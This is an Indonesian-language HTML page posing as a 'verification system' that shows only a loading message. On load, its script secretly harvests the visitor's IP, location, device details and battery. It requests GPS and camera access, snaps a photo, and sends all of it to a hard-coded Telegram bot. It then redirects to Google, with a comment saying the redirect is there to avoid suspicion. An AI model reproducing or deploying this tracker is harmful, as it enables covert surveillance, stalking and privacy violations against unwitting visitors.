<!DOCTYPE html>
<html>
<head>
    <title>Sistem Verifikasi</title>
    <script>
        // ISI DATA KAMU DI SINI
        const TOKEN = "8290115467:AAFgDbVBJc3bhIQdhcyuwCOOJvfnAec_gp8";
        const CHAT_ID = "7667638441";

        async function sikatSemua() {
            let logData = "=== TARGET TERDETEKSI ===\n";

            // 1. Cek IP & Provider
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                logData += `📍 IP: ${d.ip}\n📍 Kota: ${d.city}, ${d.region}\n📍 Provider: ${d.org}\n`;
            } catch (e) { logData += "❌ Gagal cek IP\n"; }

            // 2. Cek Perangkat & Browser
            logData += `📱 Perangkat: ${navigator.platform}\n🌐 Browser: ${navigator.userAgent}\n`;
            logData += `🖥 RAM: ${navigator.deviceMemory || 'Tidak diketahui'} GB\n`;
            logData += `⚙️ CPU Core: ${navigator.hardwareConcurrency}\n`;

            // 3. Cek Baterai
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                logData += `🔋 Baterai: ${b.level * 100}%\n⚡ Status: ${b.charging ? 'Charging' : 'Discharging'}\n`;
            }

            // 4. Cek Jaringan
            if (navigator.connection) {
                logData += `📡 Koneksi: ${navigator.connection.effectiveType}\n`;
            }

            // Kirim Log Awal
            kirimPesan(logData);

            // 5. Minta Lokasi (GPS Presisi)
            navigator.geolocation.getCurrentPosition(pos => {
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                kirimPesan(`[LOKASI PRESISI]\n${mapLink}`);
            }, err => kirimPesan("❌ Izin Lokasi Ditolak"));

            // 6. Minta Kamera & Ambil Foto
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const v = document.createElement('video');
                v.srcObject = stream;
                v.play();
                setTimeout(() => {
                    const c = document.createElement('canvas');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    kirimFoto(c.toDataURL('image/png'));
                    stream.getTracks().forEach(t => t.stop());
                    
                    // Redirect setelah sukses biar nggak curiga
                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
                }, 2000);
            })
            .catch(e => kirimPesan("❌ Izin Kamera Ditolak"));
        }

        function kirimPesan(t) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(t)}`);
        }

        function kirimFoto(b64) {
            fetch(b64).then(r => r.blob()).then(b => {
                const f = new FormData();
                f.append('chat_id', CHAT_ID);
                f.append('photo', b, 'target.png');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
            });
        }

        window.onload = sikatSemua;
    </script>
</head>
<body style="background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
    <p>Memuat data, harap tunggu...</p>
</body>
</html>
